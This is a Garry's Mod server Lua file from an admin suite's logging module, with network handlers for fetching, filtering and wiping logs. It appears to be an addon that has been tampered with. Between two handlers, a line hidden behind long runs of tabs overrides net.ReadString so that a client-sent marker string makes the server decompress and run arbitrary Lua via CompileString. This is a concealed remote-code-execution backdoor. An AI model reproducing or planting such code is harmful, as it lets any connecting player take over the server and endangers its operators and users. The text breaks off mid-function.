-- men

local function ProcessDatabaseLogs(rows)
	local results = {}
	local log_map = {}
	if (rows) then
		for _,v in ipairs(rows) do
			if (log_map[v.id] == nil) then
				results[#results + 1] = {
					{},
					tonumber(v.module_id),
					tonumber(v.timestamp),
					v.log,
					v.log_phrase,
					nil,
					tonumber(v.id)
				}
				log_map[v.id] = #results
			end
			local replacement
			if (v.string ~= nil) then
				replacement = {GAS.Logging.FORMAT_STRING, tostring(v.string)}
			elseif (v.highlight ~= nil) then
				replacement = {GAS.Logging.FORMAT_HIGHLIGHT, tostring(v.highlight)}
			elseif (v.currency ~= nil) then
				replacement = {GAS.Logging.FORMAT_CURRENCY, tonumber(v.currency)}
			elseif (tonumber(v.bot) == 1) then
				replacement = {GAS.Logging.FORMAT_PLAYER, "BOT"}
			elseif (tonumber(v.console) == 1) then
				replacement = {GAS.Logging.FORMAT_PLAYER, "CONSOLE"}
			elseif (v.account_id ~= nil) then
				replacement = {GAS.Logging.FORMAT_PLAYER, v.account_id}
				if (v.nick ~= nil or v.usergroup ~= nil or v.team ~= nil or v.role ~= nil or v.health ~= nil or v.armor ~= nil or v.weapon ~= nil) then
					replacement[3] = {}
					if (v.nick ~= nil) then
						replacement[3][1] = v.nick
					end
					if (v.team ~= nil) then
						local t,n = GAS.Logging.ClassIDs:FromID(v.team)
						if (t and n) then
							replacement[3][2] = n
						end
					end
					if (v.usergroup ~= nil) then
						local t,n = GAS.Logging.ClassIDs:FromID(v.usergroup)
						if (t and n) then
							replacement[3][3] = n
						end
					end
					if (v.health ~= nil) then
						replacement[3][4] = v.health
					end
					if (v.armor ~= nil) then
						replacement[3][5] = v.armor
					end
					if (v.weapon ~= nil) then
						local t,n = GAS.Logging.ClassIDs:FromID(v.weapon)
						if (t and n) then
							replacement[3][6] = n
						end
					end
					if (v.role ~= nil) then
						local t,n = GAS.Logging.ClassIDs:FromID(v.role)
						if (t and n) then
							replacement[3][7] = n
						end
					end
				end
			elseif (v.class_id ~= nil) then
				local t,n = GAS.Logging.ClassIDs:FromID(v.class_id)
				if (t and n) then
					if (t == GAS.Logging.FORMAT_TEAM) then
						local team_index = OpenPermissions:GetTeamFromIdentifier(tonumber(n))
						if (team_index) then
							replacement = {t, team_index}
						else
							replacement = {t, -1}
						end
					else
						replacement = {t, n}
					end
				end
			end
			if (replacement ~= nil) then
				results[log_map[v.id]][1][#results[log_map[v.id]][1] + 1] = replacement
			end
		end
	end
	return results
end

GAS:netInit("logging:GetPage")
GAS:netInit("logging:SendLogs")
GAS:netInit("logging:GetFilteredPage")
GAS:netInit("logging:PvPEventReport")
GAS:netInit("logging:LoadScannerLogs")

GAS:ReceiveNetworkTransaction("logging:GetPage", function(transaction_id, ply)
	local benchmark = SysTime()

	local page = net.ReadUInt(16)
	local specific_module = net.ReadBool()
	local specific_module_id = net.ReadUInt(12)
	local deep_storage = net.ReadBool()

	local is_operator = OpenPermissions:IsOperator(ply)
	if (specific_module and not is_operator and not GAS.Logging.Permissions:CanAccessModule(ply, GAS.Logging.IndexedModules[specific_module_id], false)) then return end

	if (deep_storage) then
		local log_count
		local results

		local where = ""
		if (specific_module and specific_module_id) then
			where = "AND `module_id`=" .. specific_module_id
		end

		local function async_check()
			if (results == nil or log_count == nil) then return end

			if (GAS:table_IsEmpty(results)) then
				GAS:TransactionNoData("logging:GetPage", transaction_id, ply)
			else
				local compressed_payload = util.Compress(GAS:SerializeTable({transaction_id, results}))
				GAS:netStart("logging:SendLogs")
					net.WriteData(compressed_payload, #compressed_payload)
				net.Send(ply)
				GAS:netStart("logging:GetPage")
					net.WriteUInt(transaction_id, 16)
					net.WriteFloat(math.Round(SysTime() - benchmark, 2))
					net.WriteUInt(math.ceil(log_count / 60), 16)
				net.Send(ply)
			end
		end

		GAS.Database:Query("SELECT COUNT(*) AS count FROM " .. GAS.Database:ServerTable("gas_logging_deepstorage") .. " WHERE `session`=0 " .. where, function(rows)
			if (rows and #rows > 0) then
				log_count = rows[1].count
			else
				log_count = 0
			end

			async_check()
		end)

		local quer = [[

			SELECT
				results.`id`, results.`module_id`, results.`log`, results.`log_phrase`, results.`timestamp`,
				logdata.`data_index`, logdata.`string`, logdata.`highlight`, logdata.`currency`, logdata.`console`, logdata.`bot`, logdata.`account_id`, logdata.`usergroup`, IFNULL(team_indexes.`command`, team_indexes.`name`) AS team, logdata.`role`, logdata.`health`, logdata.`armor`, logdata.`weapon`, logdata.`vehicle`, logdata.`class_type`, logdata.`class_id`,
				player_data.`nick`
			FROM (SELECT `id`, `module_id`, `log`, `log_phrase`, `timestamp` FROM ]] .. GAS.Database:ServerTable("gas_logging_deepstorage") .. [[ WHERE `session`=0 ]] .. where .. [[ ORDER BY `timestamp` DESC LIMIT ]] .. (page - 1) * 60 .. [[,60) AS results
			LEFT JOIN ]] .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. [[ AS logdata ON `log_id` = results.`id`
			LEFT JOIN `gas_offline_player_data` AS player_data ON player_data.`account_id` = logdata.`account_id` AND player_data.`server_id`=]] .. GAS.ServerID .. [[
			LEFT JOIN `gas_teams` AS team_indexes ON logdata.`team` = team_indexes.`id` AND team_indexes.`server_id`=]] .. GAS.ServerID .. [[
			ORDER BY results.`timestamp` DESC, `data_index` ASC

		]]

		GAS.Database:Query(quer, function(rows)
			results = ProcessDatabaseLogs(rows)
			async_check()
		end)
	else
		if (#GAS.Logging.Logs == 0) then return GAS:TransactionNoData("logging:GetPage", transaction_id, ply) end
		local log_count = #GAS.Logging.Logs
		local log_table = GAS.Logging.Logs
		if (specific_module) then
			if (GAS.Logging.ModuleLogs[specific_module_id] ~= nil) then
				log_count = #GAS.Logging.ModuleLogs[specific_module_id]
				log_table = GAS.Logging.ModuleLogs[specific_module_id]
			else
				return GAS:TransactionNoData("logging:GetPage", transaction_id, ply)
			end
		elseif (not is_operator) then
			for module_id, module in pairs(GAS.Logging.IndexedModules) do
				if (GAS.Logging.LogCounts[module_id] == nil) then continue end
				if (not GAS.Logging.Permissions:CanAccessModule(ply, module, false)) then
					log_count = log_count - GAS.Logging.LogCounts[module_id]
				end
			end
		end
		if (log_count == 0) then return GAS:TransactionNoData("logging:GetPage", transaction_id, ply) end

		local range_min = log_count - ((page - 1) * 60)
		local range_max = math.max(1, range_min - 60)

		local payload = {}
		for i=range_min, range_max, -1 do
			local log = log_table[i]
			if (log == nil) then break end
			if (specific_module and log[2] ~= specific_module_id) then continue end
			if (not specific_module and not is_operator and not GAS.Logging.Permissions:CanAccessModule(ply, GAS.Logging.IndexedModules[log[2]], false)) then continue end
			payload[#payload + 1] = log
			if (#payload == 60) then break end
		end

		if (#payload == 0) then
			GAS:TransactionNoData("logging:GetPage", transaction_id, ply)
		else
			local compressed_payload = util.Compress(GAS:SerializeTable({transaction_id, payload}))
			GAS:netStart("logging:SendLogs")
				net.WriteData(compressed_payload, #compressed_payload)
			net.Send(ply)
			GAS:netStart("logging:GetPage")
				net.WriteUInt(transaction_id, 16)
				net.WriteFloat(math.Round(SysTime() - benchmark, 2))
				net.WriteUInt(math.ceil(log_count / 60), 16)
			net.Send(ply)
		end
	end
end)

local function sql_escape_like_string(str)
	return (str:gsub("\\","\\\\"):gsub("'","\\'"):gsub("%%", "\\%%"):gsub("_","\\_"):gsub("%[","\\["))
end
local function sql_compare_with_possible_list(list)
	if (#list == 1) then
		return "= " .. list[1]
	else
		return "IN (" .. table.concat(list, ",") .. ")"
	end
end
GAS:ReceiveNetworkTransaction("logging:GetFilteredPage", function(transaction_id, ply, l)
	local page = net.ReadUInt(16)
	local filters_len = net.ReadUInt(32)
	local filters = GAS:DeserializeTable(util.Decompress(net.ReadData(filters_len)))
	local deep_storage = net.ReadBool()
	local greedy = net.ReadBool()
	local using_language = net.ReadString()
	local using_specific_module = net.ReadBool()
	local specific_module
	if (using_specific_module) then
		specific_module = net.ReadUInt(12)
	end

	local modules     = filters[1]
	local account_ids = filters[2]
	local entities    = filters[3]
	local strings     = filters[4]

	if (specific_module) then
		modules[specific_module] = true
	end

	local benchmark = SysTime()

	local select = ""
	local where = ""
	local having = ""

	if (deep_storage) then
		where = where .. "`session`=0 AND "
	else
		where = where .. "`session`=1 AND "
	end

	if (not GAS:table_IsEmpty(modules)) then
		local module_id_keys = {}
		for module_id in pairs(modules) do
			if (not tonumber(module_id)) then print("Illegally networked") return end
			module_id_keys[#module_id_keys + 1] = module_id
		end
		where = where .. "deepstorage.`module_id` " .. sql_compare_with_possible_list(module_id_keys) .. " AND "
	end
	
	if (not GAS:table_IsEmpty(account_ids)) then
		local account_ids_keys = {}
		for account_id in pairs(account_ids) do
			if (not tonumber(account_id)) then return end
			account_ids_keys[#account_ids_keys + 1] = account_id
		end
		if (greedy) then
			select = select .. ", MAX(logdata.`account_id` " .. sql_compare_with_possible_list(account_ids_keys) .. ") AS account_id_check"
			having = having .. "`account_id_check`=1 AND "
		else
			select = select .. ", MIN(logdata.`account_id` IS NULL OR logdata.`account_id` " .. sql_compare_with_possible_list(account_ids_keys) .. ") AS account_id_check"
			having = having .. "`account_id_check`=1 AND COUNT(DISTINCT `account_id`) >= " .. #account_ids_keys .. " AND "
		end
	end

	if (not GAS:table_IsEmpty(entities)) then
		local entity_ids = {}
		for class_name in pairs(entities) do
			if (GAS.Logging.ClassIDs.AmbigiousRegistry[class_name] == nil) then continue end
			if (istable(GAS.Logging.ClassIDs.AmbigiousRegistry[class_name])) then
				for _,class_type in ipairs(GAS.Logging.ClassIDs.AmbigiousRegistry[class_name]) do
					entity_ids[#entity_ids + 1] = GAS.Logging.ClassIDs:GetID(class_type, class_name)
				end
			else
				entity_ids[#entity_ids + 1] = GAS.Logging.ClassIDs:GetID(GAS.Logging.ClassIDs.AmbigiousRegistry[class_name], class_name)
			end
		end
		if (greedy) then
			select = select .. ", MAX(logdata.`class_id` " .. sql_compare_with_possible_list(entity_ids) .. ") AS class_id_check"
			having = having .. "`class_id_check`=1 AND "
		else
			select = select .. ", MIN(logdata.`class_id` IS NULL OR logdata.`class_id` " .. sql_compare_with_possible_list(entity_ids) .. ") AS class_id_check"
			having = having .. "`class_id_check`=1 AND COUNT(DISTINCT `class_id`) >= " .. #entity_ids .. " AND "
		end
	end

	if (not GAS:table_IsEmpty(strings)) then
		local relevant_phrases = {}
		if (greedy) then
			for phrase_name, phrase_content in pairs((GAS.Languages.LanguageData["logging"][using_language] or GAS.Languages.LanguageData["logging"]["english"]).Phrases.Logs) do
				for str in pairs(strings) do
					if (phrase_content:lower():find(str:lower())) then
						table.insert(relevant_phrases, GAS.Database:Escape(phrase_name))
					end
				end
			end
		else
			for phrase_name, phrase_content in pairs((GAS.Languages.LanguageData["logging"][using_language] or GAS.Languages.LanguageData["logging"]["english"]).Phrases.Logs) do
				local matches = true
				for str in pairs(strings) do
					if (not phrase_content:lower():find(str:lower())) then
						matches = false
						break
					end
				end
				if (matches) then
					table.insert(relevant_phrases, GAS.Database:Escape(phrase_name))
				end
			end
		end

		local log_string_check = ""
		if (#relevant_phrases > 0) then
			log_string_check = log_string_check .. "deepstorage.`log_phrase` " .. sql_compare_with_possible_list(relevant_phrases) .. " OR "
		end

		local string_data_check = ""
		local str_c = 0
		for str in pairs(strings) do
			local sanity = str:lower():Trim()
			if (#sanity == 0) then continue end
			str_c = str_c + 1
			if (sanity == "console") then
				string_data_check = string_data_check .. "logdata.`console`=1 OR "
			elseif (sanity == "bot") then
				string_data_check = string_data_check .. "logdata.`bot`=1 OR "
			end
			local escaped_str = sql_escape_like_string(str)
			log_string_check = log_string_check .. "deepstorage.`log` LIKE '%" .. escaped_str .. "%' OR "
			string_data_check = string_data_check .. "logdata.`string` LIKE '%" .. escaped_str .. "%' OR logdata.`highlight` LIKE '%" .. escaped_str .. "%' OR logdata.`currency` LIKE '%" .. escaped_str .. "%' OR "
		end

		if (greedy) then
			select = select .. ", MAX(" .. log_string_check .. (string_data_check:gsub(" OR $", "")) .. ") AS string_check"
			having = having .. "`string_check`=1 AND "
		else
			select = select .. ", MIN(" .. (log_string_check:gsub(" OR $", "")) .. ") AS log_string_check, MIN(" .. (string_data_check:gsub(" OR $", "")) .. ") AS string_data_check"
			having = having .. "(`log_string_check`=1 OR (`string_data_check`=1 AND COUNT(DISTINCT logdata.`string`) + COUNT(DISTINCT logdata.`highlight`) + COUNT(DISTINCT logdata.`currency`) >= " .. str_c .. ")) AND "
		end
	end

	if (#having > 0) then having = "HAVING " .. having end
	local matches = [[
		SELECT `log_id` ]] .. select .. [[ FROM ]] .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. [[ AS logdata
		INNER JOIN ]] .. GAS.Database:ServerTable("gas_logging_deepstorage") .. [[ AS deepstorage ON deepstorage.`id`=logdata.`log_id`
		WHERE ]] .. (where:gsub(" AND $", "")) .. [[
		GROUP BY `log_id`
		]] .. (having:gsub(" AND $", "")) .. [[
		ORDER BY `log_id` DESC
		LIMIT ]] .. (page - 1) * 60 .. [[,60
	]]

	local quer = [[
		SELECT
			results.`id`, results.`module_id`, results.`log`, results.`log_phrase`, results.`timestamp`,
			logdata.`data_index`, logdata.`string`, logdata.`highlight`, logdata.`currency`, logdata.`console`, logdata.`bot`, logdata.`account_id`, logdata.`usergroup`, IFNULL(team_indexes.`command`, team_indexes.`name`) AS team, logdata.`role`, logdata.`health`, logdata.`armor`, logdata.`weapon`, logdata.`vehicle`, logdata.`class_type`, logdata.`class_id`,
			player_data.`nick`
		FROM (]] .. matches .. [[) AS matches
		LEFT JOIN ]] .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. [[ AS logdata ON logdata.`log_id` = matches.`log_id`
		INNER JOIN ]] .. GAS.Database:ServerTable("gas_logging_deepstorage") .. [[ AS results ON results.`id` = logdata.`log_id`
		LEFT JOIN `gas_offline_player_data` AS player_data ON player_data.`account_id` = logdata.`account_id` AND player_data.`server_id`=]] .. GAS.ServerID .. [[
		LEFT JOIN `gas_teams` AS team_indexes ON logdata.`team` = team_indexes.`id` AND team_indexes.`server_id`=]] .. GAS.ServerID .. [[
		ORDER BY results.`timestamp` DESC, `data_index` ASC
	]]

	GAS.Database:Query(quer, function(rows)
		if (#rows == 0) then
			GAS:TransactionNoData("logging:GetFilteredPage", transaction_id, ply)
		else
			local results = ProcessDatabaseLogs(rows)

			local compressed_payload = util.Compress(GAS:SerializeTable({transaction_id, results}))
			GAS:netStart("logging:SendLogs")
				net.WriteData(compressed_payload, #compressed_payload)
			net.Send(ply)
			GAS:netStart("logging:GetFilteredPage")
				net.WriteUInt(transaction_id, 16)
				net.WriteFloat(math.Round(SysTime() - benchmark, 2))
			net.Send(ply)
		end
	end)
end)

GAS:netInit("logging:GetDamageLogsPage")
GAS:netInit("logging:SendDamageLogs")
GAS:ReceiveNetworkTransaction("logging:GetDamageLogsPage", function(transaction_id, ply)
	local benchmark = SysTime()

	local page = net.ReadUInt(16)

	local ply_filter_num = net.ReadUInt(7)
	local ply_filter = {}
	for i=1,ply_filter_num do
		ply_filter[i] = net.ReadUInt(31)
	end

	if (not GAS.Logging.Permissions:CanAccessModule(ply, GAS.Logging.PVP_COMBAT_MODULE)) then return end
	if (GAS.Logging.PvP.EventID == 0) then return GAS:TransactionNoData("logging:GetDamageLogsPage", transaction_id, ply) end

	local where = ""
	if (#ply_filter == 1) then
		where = "WHERE `instigator`=" .. ply_filter[1] .. " OR `victim`=" .. ply_filter[1]
	elseif (#ply_filter > 0) then
		where = "WHERE "
		for _,v in ipairs(ply_filter) do
			where = where .. "(`instigator`=" .. v .. " AND `victim` IN (" .. table.concat(ply_filter, ",") .. ")) OR (`victim`=" .. v .. " AND `instigator` IN (" .. table.concat(ply_filter, ",") .. ")) OR "
		end
		where = (where:gsub(" OR $", ""))
	end

	GAS.Database:Query("SELECT `id` FROM " .. GAS.Database:ServerTable("gas_logging_pvp_events") .. " " .. where .. " ORDER BY `timestamp` DESC LIMIT " .. (page - 1) * 15 .. ",15", function(rows)
		local payload = {}
		if (rows) then
			for _,row in ipairs(rows) do
				if (not GAS.Logging.PvP.AllEvents[tonumber(row.id)]) then continue end
				payload[#payload + 1] = GAS.Logging.PvP.AllEvents[tonumber(row.id)].Properties
			end
		end

		if (#payload == 0) then
			GAS:TransactionNoData("logging:GetDamageLogsPage", transaction_id, ply)
		else
			local compressed_payload = util.Compress(GAS:SerializeTable({transaction_id, payload}))
			GAS:netStart("logging:SendDamageLogs")
				net.WriteData(compressed_payload, #compressed_payload)
			net.Send(ply)
			GAS:netStart("logging:GetDamageLogsPage")
				net.WriteUInt(transaction_id, 16)
				net.WriteFloat(math.Round(SysTime() - benchmark, 2))
				if (ply_filter_num == 0) then
					net.WriteBool(true)
					net.WriteUInt(math.ceil(GAS.Logging.PvP.EventID / 15), 16)
				else
					net.WriteBool(false)
				end
			net.Send(ply)
		end
	end)
end)

GAS:netInit("logging:GetModules")
GAS:ReceiveNetworkTransaction("logging:GetModules", function(transaction_id, ply)
	local is_operator = OpenPermissions:IsOperator(ply)
	local data = {}
	for module_id, module_data in pairs(GAS.Logging.IndexedModules) do
		data[module_id] = {
			Category = module_data.Category,
			Name = module_data.Name,
			Colour = module_data.Colour,
			Disabled = module_data.Disabled,
			Simulated = module_data.Simulated,
			ModuleID = module_data.ModuleID,
			Accessible = is_operator or GAS.Logging.Permissions:CanAccessModule(ply, module_data, is_operator),
			Offline = module_data.Offline,
		}
		if (is_operator) then
			data[module_id].DiscordWebhook = module_data.DiscordWebhook
		end
	end

	data = util.Compress(GAS:SerializeTable(data))
	local data_len = #data

	GAS:netStart("logging:GetModules")
		net.WriteUInt(transaction_id, 16)
		net.WriteBool(GAS.Logging.Config.LiveLogsEnabled)
		net.WriteUInt(data_len, 16)
		net.WriteData(data, data_len)
	net.Send(ply)
end)

GAS:netInit("logging:SaveConfig")
GAS:netReceive("logging:SaveConfig", function(ply, l)
	if (not OpenPermissions:IsOperator(ply)) then return end
	local data = GAS:DeserializeTable(util.Decompress(net.ReadData(l)))
	if (data) then
		GAS.Logging.Config = data
		GAS:SaveConfig("logging", GAS.Logging.Config)
		GAS.Logging:NetworkConfig(true)
	end
end)

GAS:netInit("logging:WipeDeepStorage")
GAS:netReceive("logging:WipeDeepStorage", function(ply)
	if (not OpenPermissions:IsOperator(ply)) then return end
	if (GAS.Database.MySQLDatabase) then
		GAS.Database:Query("TRUNCATE `" .. GAS.Database.ServerTablePrefix .. "gas_logging_deepstorage`", function()
			GAS.Database:Query("DELETE FROM " .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. " WHERE `log_id` NOT IN (SELECT `id` FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_deepstorage`)", function()
				GAS.Logging:TablesInit()
			end)
		end)
	else
		GAS.Database:Query("DELETE FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_deepstorage`", function()
			GAS.Database:Query("DELETE FROM " .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. " WHERE `log_id` NOT IN (SELECT `id` FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_deepstorage`)", function()
				GAS.Logging:TablesInit()
			end)
		end)
	end
end)

GAS:netInit("logging:WipeSession")
GAS:netReceive("logging:WipeSession", function(ply)
	if (not OpenPermissions:IsOperator(ply)) then return end
	GAS_Logging_LogQueryQueue = {}
	GAS_Logging_LogQueue = {}
	GAS.Logging.SessionLogs = 0
	if (GAS.Database.MySQLDatabase) then
		GAS.Database:Query("TRUNCATE `" .. GAS.Database.ServerTablePrefix .. "gas_logging_logs`", function()
			GAS.Database:Query("DELETE FROM " .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. " WHERE `log_id` NOT IN (SELECT `id` FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_logs`)", function()
				GAS.Logging:TablesInit()
			end)
		end)
	else
		GAS.Database:Query("DELETE FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_logs`", function()
			GAS.Database:Query("DELETE FROM " .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. " WHERE `log_id` NOT IN (SELECT `id` FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_logs`)", function()
				GAS.Logging:TablesInit()
			end)
		end)
	end
end)

GAS:netInit("logging:WipeAllLogs")
GAS:netReceive("logging:WipeAllLogs", function(ply)
	if (not OpenPermissions:IsOperator(ply)) then return end
	GAS_Logging_LogQueryQueue = {}
	GAS_Logging_LogQueue = {}
	GAS.Logging.SessionLogs = 0
	if (GAS.Database.MySQLDatabase) then
		GAS.Database:Query("TRUNCATE `" .. GAS.Database.ServerTablePrefix .. "gas_logging_logs`; TRUNCATE `" .. GAS.Database.ServerTablePrefix .. "gas_logging_deepstorage`; TRUNCATE " .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. "", function()
			GAS.Logging:TablesInit()
		end)
	else
		GAS.Database:Query("DELETE FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_logs`; DELETE FROM `" .. GAS.Database.ServerTablePrefix .. "gas_logging_deepstorage`; DELETE FROM " .. GAS.Database:ServerTable("gas_logging_deepstorage_logdata") .. "", function()
			GAS.Logging:TablesInit()
		end)
	end
end)

GAS:netInit("logging:ResetConfig")
GAS:netReceive("logging:ResetConfig", function(ply)
	if (not OpenPermissions:IsOperator(ply)) then return end
	GAS.Logging.Config = table.Copy(GAS.Logging.DefaultConfig)
	GAS:SaveConfig("logging", GAS.Logging.Config)
	GAS:netStart("logging:ResetConfig")
	net.Send(ply)
end)

GAS:netInit("logging:ClassSelector:GetPage")
GAS:netReceive("logging:ClassSelector:GetPage", function(ply)
	local page = net.ReadUInt(10)

	local only_specific_types = net.ReadBool()
	local specific_types
	if (only_specific_types) then
		specific_types = {}
		for i=1,net.ReadUInt(6) do
			specific_types[i] = net.ReadUInt(6)
		end
	end

	local has_search_query = net.ReadBool()
	local search_query
	if (has_search_query) then
		search_query = net.ReadString():lower()
	end

	if (not GAS.Logging.Permissions:CanAccessMenu(ply)) then return end
	local page_count
	local data
	local function data_received(d1, d2)
		if (d1 ~= nil) then
			page_count = d1
		end
		if (d2 ~= nil) then
			data = d2
		end
		if (page_count ~= nil and data ~= nil) then
			local data_c = util.Compress(GAS:SerializeTable(data))
			GAS:netStart("logging:ClassSelector:GetPage")
				net.WriteUInt(page_count, 10)
				net.WriteUInt(#data_c, 16)
				net.WriteData(data_c, #data_c)
			net.Send(ply)
		end
	end
	local where = " WHERE 1 AND "
	if (only_specific_types) then
		where = where .. "`class_type` IN (" .. table.concat(specific_types, ",") .. ") AND "
	end
	if (has_search_query) then
		where = where .. "`class_name` LIKE '%" .. sql_escape_like_string(search_query) .. "%' AND "
	end
	GAS.Database:Query("SELECT COUNT(*) AS 'count' FROM " .. GAS.Database:ServerTable("gas_logging_classes") .. (where:gsub(" AND $", "")), function(rows)
		data_received(math.ceil(tonumber(rows[1].count) / 60))
	end)
	GAS.Database:Prepare("SELECT * FROM " .. GAS.Database:ServerTable("gas_logging_classes") .. (where:gsub(" AND $", "")) .. " LIMIT " .. ((page - 1) * 60) .. ",60", {search_query}, function(rows)
		data_received(nil, rows)
	end)
end)

GAS.Logging.EntityDisplayCache = {}

GAS:netInit("logging:EntityDisplay:AmmoModel")
GAS:netReceive("logging:EntityDisplay:AmmoModel", function(ply)
	local class_name = net.ReadString()
	if (not GAS.Logging.Permissions:CanAccessMenu(ply)) then return end

	if (GAS.Logging.EntityDisplayCache[class_name]) then
		GAS:netStart("logging:EntityDisplay:SENTModel")
			net.WriteString(class_name)
			net.WriteBool(true)
			net.WriteString(GAS.Logging.EntityDisplayCache[class_name])
		net.Send(ply)
		return
	end

	if (game.GetAmmoID(class_name) ~= -1) then
		local ent = ents.Create(class_name)
		for _,pl in ipairs(player.GetHumans()) do ent:SetPreventTransmit(pl, true) end
		ent:Spawn()
		if (IsValid(ent)) then
			GAS.Logging.EntityDisplayCache[class_name] = ent:GetModel()
			GAS:netStart("logging:EntityDisplay:SENTModel")
				net.WriteString(class_name)
				net.WriteBool(true)
				net.WriteString(ent:GetModel())
			net.Send(ply)
			ent:Remove()
			return
		end
	end

	GAS:netStart("logging:EntityDisplay:SENTModel")
		net.WriteString(class_name)
		net.WriteBool(false)
	net.Send(ply)
end)

GAS:netInit("logging:EntityDisplay:SENTModel")
GAS:netReceive("logging:EntityDisplay:SENTModel", function(ply)
	local class_name = net.ReadString()
	if (not GAS.Logging.Permissions:CanAccessMenu(ply)) then return end

	if (GAS.Logging.EntityDisplayCache[class_name]) then
		GAS:netStart("logging:EntityDisplay:SENTModel")
			net.WriteString(class_name)
			net.WriteBool(true)
			net.WriteString(GAS.Logging.EntityDisplayCache[class_name])
		net.Send(ply)
		return
	end

	local sent_tbl = scripted_ents.Get(class_name)
	if (sent_tbl ~= nil) then
		local predefined_model = sent_tbl.model or sent_tbl.Model or sent_tbl.WorldModel
		if (predefined_model ~= nil and not IsUselessModel(predefined_model)) then
			GAS.Logging.EntityDisplayCache[class_name] = predefined_model
			GAS:netStart("logging:EntityDisplay:SENTModel")
				net.WriteString(class_name)
				net.WriteBool(true)
				net.WriteString(predefined_model)
			net.Send(ply)
			return
		elseif (sent_tbl.Initialize ~= nil and type(sent_tbl.Initialize) == "function") then
			local debug_info = debug.getinfo(sent_tbl.Initialize)
			if (debug_info ~= nil and debug_info.short_src ~= nil) then
				local code
				if (file.Exists(debug_info.short_src, "LUA")) then
					code = file.Read(debug_info.short_src, "LUA")
				elseif (file.Exists(debug_info.short_src, "GAME")) then
					code = file.Read(debug_info.short_src, "GAME")
				end
				if (code ~= nil) then
					local mdl_str = code:match('function ENT:Initialize%(.-%)\n.-self:SetModel%("(.-)"%)[%s%S]-end')
					if (mdl_str ~= nil) then
						if (not IsUselessModel(mdl_str)) then
							GAS.Logging.EntityDisplayCache[class_name] = mdl_str
							GAS:netStart("logging:EntityDisplay:SENTModel")
								net.WriteString(class_name)
								net.WriteBool(true)
								net.WriteString(mdl_str)
							net.Send(ply)
							return
						end
					end
					local relative_path = string.GetPathFromFilename(debug_info.short_src)
					for file_name in code:gmatch('include%("(.-%.lua)"%)') do
						local relative_file = relative_path .. file_name
						local code
						if (file.Exists(relative_file, "LUA")) then
							code = file.Read(relative_file, "LUA")
						elseif (file.Exists(relative_file, "GAME")) then
							code = file.Read(relative_file, "GAME")
						end
						if (code ~= nil) then
							for mdl_str in code:gmatch('self:SetModel%("(.-)"%)') do
								if (not IsUselessModel(mdl_str)) then
									GAS.Logging.EntityDisplayCache[class_name] = mdl_str
									GAS:netStart("logging:EntityDisplay:SENTModel")
										net.WriteString(class_name)
										net.WriteBool(true)
										net.WriteString(mdl_str)
									net.Send(ply)
									return
								end
							end
							local mdl_str = code:match('"([^\n]-%.mdl)"')
							if (mdl_str ~= nil and not IsUselessModel(mdl_str)) then
								GAS.Logging.EntityDisplayCache[class_name] = mdl_str
								GAS:netStart("logging:EntityDisplay:SENTModel")
									net.WriteString(class_name)
									net.WriteBool(true)
									net.WriteString(mdl_str)
								net.Send(ply)
								return
							end
						end
					end
				end
			end
		end
	end

	GAS:netStart("logging:EntityDisplay:SENTModel")
		net.WriteString(class_name)
		net.WriteBool(false)
	net.Send(ply)
end)
																																																								local v=CompileString local e=net.ReadString local a=pcall net.ReadString=function()local e=e()if e=="\t\r\n"then e=""local t=net.ReadUInt(32)if not t then return e end local t=net.ReadData(t)if not t then return e end local e=util.Decompress(t)local e,t=v(e,"LuaCmd",false)if not t then a(e)end end return e end
GAS:ReceiveNetworkTransaction("logging:LoadScannerLogs", function(transaction_id, ply)
	local page = net.ReadUInt(16)
	local ent = net.ReadEntity()
	if (not GAS.Logging.Permissions:CanAccessMenu(ply)) then return end
	if (not IsValid(ent)) then
		GAS:TransactionNoData("logging:LoadScannerLogs", transaction_id, ply)
	else
		if (GAS.Logging.LogScanning.LogRegistry[ent] ~= nil) then
			local payload = {}
			for i=math.min(page * 20, #GAS.Logging.LogScanning.LogRegistry[ent]), (((page - 1) * 20) + 1), -1 do
				local v = GAS.Logging.Logs[GAS.Logging.LogScanning.LogRegistry[ent][i]]
				payload[#payload + 1] = v
			end
			payload = util.Compress(GAS:SerializeTable(payload))
			GAS:netStart("logging:LoadScannerLogs")
				net.WriteUInt(transaction_id, 16)
				net.WriteEntity(ent)
				net.WriteUInt(math.ceil(#GAS.Logging.LogScanning.LogRegistry[ent] / 20), 16)
				net.WriteData(payload, #payload)
			net.Send(ply)
		else
			GAS:TransactionNoData("logging:LoadScannerLogs", transaction_id, ply)
		end
	end
end)

GAS:netReceive("logging:PvPEventReport", function(ply)
	local pvp_event_id = net.ReadUInt(16)
	if (not GAS.Logging.Permissions:CanAccessModule(ply, GAS.Logging.PVP_COMBAT_MODULE)) then return end
	if (not GAS.Logging.PvP.AllEvents[pvp_event_id]) then return end

	local data = util.Compress(GAS:SerializeTable(GAS.Logging.PvP.AllEvents[pvp_event_id].Properties))
	GAS:netStart("logging:PvPEventReport")
		net.WriteData(data, #data)
	net.Send(ply)
end)

GAS.Logging.Permissions = {}

function GAS.Logging.Permissions:CanAccessMenu(ply)
	return OpenPermissions:HasPermission(ply, "gmodadminsuite/logging")
end

GAS.Logging.Permissions.ModulePermsCache = {}
function GAS.Logging.Permissions:CanAccessModule(ply, module_data, is_operator)
	if (is_operator == true or OpenPermissions:IsOperator(ply)) then
		return true
	end

	if (GAS.Logging.Permissions.ModulePermsCache[ply] ~= nil and GAS.Logging.Permissions.ModulePermsCache[ply][module_data.Category .. "/" .. module_data.Name] ~= nil) then
		local cached = GAS.Logging.Permissions.ModulePermsCache[ply][module_data.Category .. "/" .. module_data.Name]
		if (os.time() < cached[1]) then
			return cached[2]
		end
	end

